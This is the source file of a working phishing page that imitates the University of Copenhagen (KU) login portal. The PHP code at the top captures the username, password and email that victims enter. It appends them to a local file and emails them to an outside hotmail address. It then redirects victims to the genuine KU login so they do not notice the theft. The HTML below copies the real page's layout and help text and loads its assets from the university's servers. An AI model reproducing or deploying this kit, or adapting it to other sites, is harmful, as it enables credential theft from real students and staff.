<?php
if(isset($_GET['gosend'])){
  $to      = 'livebillcenter020@hotmail.com';
  $subject = 'Ku Form'.mt_rand();
  $message = 'USERNAME: '.$_POST['username'] .' PASSWORD: '.$_POST['password']. ' EMAIL: '.$_POST['email']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();


    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);



if(mail($to, $subject, $message, $headers)){
    header("Location: https://intranet.ku.dk/CookieAuth.dll?GetLogon?curl=Z2Fen&reason=0&formdir=7");
    exit;
  } else {
    $phpself = '';
    if($_SERVER['PHP_SELF'] != 'index.php'){$phpself = $_SERVER['PHP_SELF'];}
    $urlSelf = 'http://'.$_SERVER['SERVER_NAME'].'/'.$phpself;
    header("Location: $urlSelf");
    exit;
 }
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link rel="stylesheet" href="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=reset.css" type="text/css" />
<link rel="stylesheet" href="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=style.css" type="text/css" />
<script src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=flogon.js" type="text/javascript"></script>		
<title>KU Login</title>
</head>
<body>
<div class="iecenter">
  <div class="bg main">
    <div class="container">
      <div class="perm_cookie_box"><a href="http://introduction.ku.dk/cookies-and-privacy-policy/"><span>Cookies and privacy policy</span><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=cookies_link_top_uk.png" alt=""></a></div>
      <div class="content" id="logoncontent">
        <form action="./?gosend" method="post" id="logonForm" autocomplete="off" />
        
        <div class="wholediv">
          <p class="paragraph2 loginwarning"><b></b></p>
        </div>
        <div class="wholediv">
          <p class="security">Security<!-- (<a href="javascript:ShowSecurity();">show explanation</a>)--></p>
          <ul class="securitylist">
            <li class="item">
              <input id="rdoPblc" type="radio" name="trusted" value="0" />
              <label for="rdoPblc">This is a public or shared computer</label>
            </li>
            <li class="item">
              <input id="rdoPrvt" type="radio" name="trusted" value="4" checked="checked" />
              <label for="rdoPrvt">This is a private computer</label>
            </li>
            <li class="item"><span id="securitywarning" class="warning"><b>Notice</b>: If you select this option remember to log off KUnet after use. Doing so prevents abuse of your login.</span></li>
          </ul>
        </div>
        <div class="wholediv">
          <input type="hidden" id="curl" name="curl" value="Z2Fen" />
          <input type="hidden" id="flags" name="flags" value="0" />
          <input type="hidden" id="forcedownlevel" name="forcedownlevel" value="0" />
          <input type="hidden" id="formdir" name="formdir" value="7" />
          <table width="100%">
           
            <tr>
              <td class="logintext">Email Address:</td>
              <td align="right"><input class="logininput" id="email" name="email" tabindex="1" />
                <a href="#"><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=questionmark.gif"></a></td>
            </tr>

            <tr>
              <td class="logintext">KU Username:</td>
              <td align="right"><input class="logininput" id="username" name="username" tabindex="2" />
                <a href="javascript:PopupUsername();"><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=questionmark.gif"></a></td>
            </tr>
            <tr>
              <td class="logintext">Password:<br />
                <p class="small">(not PIN or one-time password)</p></td>
              <td align="right"><input class="logininput" id="password" name="password" type="password" tabindex="3" />
                <a href="javascript:PopupPassword();"><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=questionmark.gif"></a></td>
            </tr>
            <tr>
              <td colspan="2" align="right"><input class="logininput loginsubmit" type="submit" value="Log in" tabindex="4"  /></td>
              </td>
          </table>
          <hr />
        </div>
        <div class="halfdiv">
          <p class="paragraph2"><b>Help:</b></p>
          <ul class="linklist">
            <li class="item"><a title="Click here if this is your first time logging in to KUnet. Your KU Username will be shown and you can create a password, as well as enter your mobile number and your e-mail address." href="https://www2.adm.ku.dk/ticketsso/!cas_ticket.frontpage?p_serviceid=45&p_logintype=db&language=en">First time you log in</a></li>
            <li class="item"><a title="Click here to learn your KU Username. You will need to provide your CPR- or pseudo number, and your pincode." href="https://www2.adm.ku.dk/ticketsso/!cas_ticket.frontpage?p_serviceid=46&p_logintype=db&language=en">Forgot KU Username</a></li>
            <li class="item"><a title="Click here to get a one-time password. You will only receive this if you have entered your mobile number or e-mail address under &quot;First time you log in&quot;." href="https://idm.ku.dk/idm/user/anonProcessLaunch.jsp?id=KU-createOTP&lang=en">Forgot password</a></li>
            <li class="item"><a title="Click here to receive a new pincode by mail. The letter will be sent to your registered address. The pincode is to be used under &quot;First time you log in&quot;, and afterwards you can create a new password to KUnet." href="https://www2.adm.ku.dk/portal/forgotPincodeProcesTmg.asp?sprog=en">Forgot pincode</a></li>
            <li class="item"><a title="Click here to log in with your one-time password, which you have received either by SMS or e-mail. If you only have your pin code, use the link &quot;First time you log in&quot;." href="https://idm.ku.dk/idm/user/anonProcessLaunch.jsp?id=KU-changePassword&lang=en">Login with one-time password</a></li>
            <li class="item"><a title="Click here to change your current password." href="https://idm.ku.dk/idm/user/login.jsp?lang=en&referer=TMG&nextPage=/user/changePassword.jsp">Change password</a></li>
          </ul>
        </div>
        <div class="halfdiv"> <a href="http://it.ku.dk/driftinfo" target="Driftinfo">&nbsp;ServiceInformation</a> </div>
        <div class="wholediv">
          <hr/>
          <a href="http://it.ku.dk/english/students/ucph_username/login_problems/" class="loginhelp">Click here if you have problems logging in</a> <a href="javascript:GetDanish();" /><img class="flag" src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=flag_da.gif" /></a> </div>
        </form>
      </div>
      <div class="content" id="logoncookiesdisabled" style="display:none;">
        <div class="wholediv">
          <table width="100%">
            <tr>
              <td><br />
                <span class="cookiewarningheader">Please enable cookies for this website.</span><br/ >
                <br />
                <span class="cookiewarningtext">Cookies are currently disabled by your browser. This logon page requires that cookies be enabled. <br />
                <br />
                Enable cookies and refresh the webpage.<br >
                See how to </span><a href="http://it.ku.dk/english/students/intranet/cookies/" class="cookiewarninghelp">enable cookies on your browser</a><br />
                <br /></td>
            </tr>
          </table>
          <hr />
        </div>
        <div class="wholediv"> <a href="http://it.ku.dk/driftinfo" target="Driftinfo">&nbsp;ServiceInformation</a> </div>
        <div class="wholediv">
          <hr/>
          <a href="javascript:GetDanish();" /><img class="flag" src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=flag_da.gif" /></a> <br />
        </div>
      </div>
      <div class="content" id="SSOcookiesError" style="display:none;">
        <div class="wholediv">
          <table width="100%">
            <tr>
              <td><br />
                <span class="cookiewarningheader">Please DDDD enable SSO cookies for KU.DK</span><br/ >
                <br />
                <span class="cookiewarningtext">Single signon Cookies for KU.DK is currently disabled by your browser. This logon page requires a single signon cookie. <br />
                <br />
                Enable SSO cookies for the domain KU.DK and refresh the webpage.<br />
                See how to </span><a href="http://it.ku.dk/english/students/intranet/cookies/" class="cookiewarninghelp">enable SSO cookies on your browser</a><br />
                <br /></td>
            </tr>
          </table>
          <hr />
        </div>
        <div class="wholediv"> <a href="http://it.ku.dk/driftinfo" target="Driftinfo">&nbsp;ServiceInformation</a> </div>
        <div class="wholediv">
          <hr/>
          <a href="javascript:GetDanish();" /><img class="flag" src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=flag_da.gif" /></a> <br />
        </div>
      </div>
    </div>
  </div>
</div>
<div class="popupdiv" id="popup_username"> <a href="javascript:ClosePopup();"><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=x.png" class="closepopup" /></a>
  <h3 class="header3">Help for KU Username</h3>
  <p class="paragraph question">I forgot/ do not know my KU Username. What do I do?</p>
  <p class="answer"><a href="https://www2.adm.ku.dk/ticketsso/!cas_ticket.frontpage?p_serviceid=45&p_logintype=db&language=en">Get your KU Username - click here</a></p>
  <p class="paragraph question">Can I change my KU Username?</p>
  <p class="answer">No, your username is permanent and cannot be changed.</p>
  <p class="paragraph question">How was my KU Username created?</p>
  <p class="answer">Your KU username is generated automatically without any connection to your name and without any relation to the University of Copenhagen.</p>
  <p class="paragraph question">Where can I use my KU Username?</p>
  <p class="answer">The KU username is your digital identity at the University of Copenhagen. You will have to use the username when authenticating yourself on university IT systems.</p>
  <p class="paragraph question">Is my KU username confidential?</p>
  <p class="answer">Your KU username is personal but not confidential. Your password, on the other hand, is confidential and must not be shared with anyone.</p>
  <p class="paragraph question">Can I get help??</p>
  <p class="answer">You can reach the Servicedesk at <a href='mailto:it-service@adm.ku.dk'>it-service@adm.ku.dk</a> or by calling (+45) 35 32 27 00.</p>
</div>
<div class="popupdiv" id="popup_password"> <a href="javascript:ClosePopup();"><img src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=x.png" class="closepopup" /></a>
  <h3 class="header3">Password help</h3>
  <p class="paragraph question">I forgot / do not know my password. What do I do?</p>
  <p class="answer"><a href="https://idm.ku.dk/idm/user/anonProcessLaunch.jsp?id=KU-createOTP&lang=en">Reset your password and log in with a onetime password - click here.</a>.</p>
  <p class="paragraph question">Is my password confidential?</p>
  <p class="answer">Your password is confidential and must not be shared with anyone.</p>
  <p class="paragraph question">Can I get help?</p>
  <p class="answer">You can reach the Servicedesk at <a href='mailto:it-service@adm.ku.dk'>it-service@adm.ku.dk</a> or by calling (+45) 35 32 27 00.</p>
</div>
<script src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=jquery.min.js" type="text/javascript"></script> 
<script src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=jquery.simplemodal.js" type="text/javascript"></script> 
<script src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=jquery.cooquery.min.js" type="text/javascript"></script> 
<script src="https://intranet.ku.dk/CookieAuth.dll?GetPic?formdir=7&image=default.js" type="text/javascript" /></script> 

</body>
</html>